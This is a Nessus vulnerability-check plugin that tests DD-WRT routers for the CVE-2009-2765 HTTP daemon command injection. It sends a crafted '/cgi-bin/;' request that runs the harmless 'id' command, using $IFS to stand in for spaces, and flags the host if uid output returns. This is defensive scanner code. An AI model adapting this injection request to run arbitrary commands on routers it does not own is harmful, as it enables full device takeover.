#
# (C) Tenable Network Security, Inc.
#


include("compat.inc");


if(description)
{
  script_id(40353);
  script_version("$Revision: 1.17 $");

  script_cve_id("CVE-2009-2765");
  script_bugtraq_id(35742);
  script_osvdb_id(55990);
  script_xref(name:"EDB-ID", value:"9209");

  script_name(english:"DD-WRT HTTP Daemon Metacharacter Injection Remote Code Execution");
  script_summary(english:"Tries to execute a command");
 
  script_set_attribute(
    attribute:"synopsis",
    value:"An attacker can execute arbitrary code on the remote router."
  );
  script_set_attribute( attribute:"description", value:
"The remote web server is vulnerable to a command injection attack that 
may allow an attacker to execute arbitrary commands on the remote server
(usually with root privileges).
An attacker can exploit this flaw to take complete ownership of the 
remote device."  );
  script_set_attribute(
    attribute:"see_also", 
    value:"http://www.dd-wrt.com/dd-wrtv3/index.php"
  );
  script_set_attribute(
    attribute:"see_also", 
    value:"http://www.dd-wrt.com/phpBB2/viewtopic.php?t=55173"
  );
  script_set_attribute(
    attribute:"solution", 
    value:"Unknown at this time."
  );
  script_set_cvss_base_vector("CVSS2#AV:A/AC:L/Au:N/C:C/I:C/A:C");
  script_set_cvss_temporal_vector("CVSS2#E:POC/RL:OF/RC:C");
  script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
  script_set_attribute(attribute:"exploit_available", value:"true");
 script_set_attribute(attribute:"metasploit_name", value:'DD-WRT HTTP Daemon Arbitrary Command Execution');
 script_set_attribute(attribute:"exploit_framework_metasploit", value:"true");
 script_cwe_id(20);
  script_set_attribute(
    attribute:"vuln_publication_date", 
    value:"2009/07/20"
  );
  script_set_attribute(
    attribute:"plugin_publication_date", 
    value:"2009/07/23"
  );
 script_cvs_date("$Date: 2016/05/19 17:45:43 $");
  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_set_attribute(attribute:"exploited_by_nessus", value:"true");
  script_end_attributes();

  script_category(ACT_ATTACK);
  script_family(english:"Web Servers");

  script_copyright(english:"This script is Copyright (C) 2009-2016 Tenable Network Security, Inc.");

  script_dependencie("http_version.nasl");
  script_require_ports("Services/www", 80);

  exit(0);
}


include("global_settings.inc");
include("misc_func.inc");
include("http.inc");
include("url_func.inc");


port = get_http_port(default:80, embedded:TRUE);

file = http_get_cache(port:port, item:"/", exit_on_fail: 1);
if (
  "http://www.dd-wrt.com/" >!< file &&
  ">DD-WRT Control Panel<" >!< file
) exit(0, "DD-WRT is not running on the remote host.");


cmd = "id";
cmd_pat = "uid=[0-9]+.*gid=[0-9]+.*";

enc_cmd = str_replace(find:" ", replace:"$IFS", string:cmd);
enc_cmd = urlencode(
  str        : enc_cmd,
  unreserved : "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789_!~*'()-]/=;$"
);


# nb: don't use the HTTP API here as the remote server will not 
#     answer with a valid HTTP reply.
for (fd=5; fd<=7; fd++)
{
  soc = open_sock_tcp(port);
  if (!soc) exit(1, "Could not re-connect to the remote server.");

  req = string(
    'GET /cgi-bin/;', enc_cmd, '>&', fd, ' HTTP/1.0\r\n',
    '\r\n'
  );
  send(socket:soc, data:req);
  res = recv(socket:soc, length:4096);
  if (res && egrep(pattern:cmd_pat, string:res))
  {
    if (report_verbosity > 0)
    {
      report = string(
        "\n",
        "Nessus was able to execute the command '", cmd, "' on the remote \n",
        "host using the following request :\n",
        "\n",
        crap(data:"-", length:30), " snip ", crap(data:"-", length:30), "\n",
        req,
        crap(data:"-", length:30), " snip ", crap(data:"-", length:30), "\n"
      );
      if (report_verbosity > 1)
      {
        output = res - strstr(res, "HTTP/1.0 401 Unauthorized");
        report = string(
          report,
          "\n",
          "It produced the following output :\n",
          "\n",
          crap(data:"-", length:30), " snip ", crap(data:"-", length:30), "\n",
          output,
          crap(data:"-", length:30), " snip ", crap(data:"-", length:30), "\n"
        );
      }
      security_hole(port:port, extra:report);
    }
    else security_hole(port);

    exit(0);
  }
}
exit(0, 'The host is not vulnerable.');
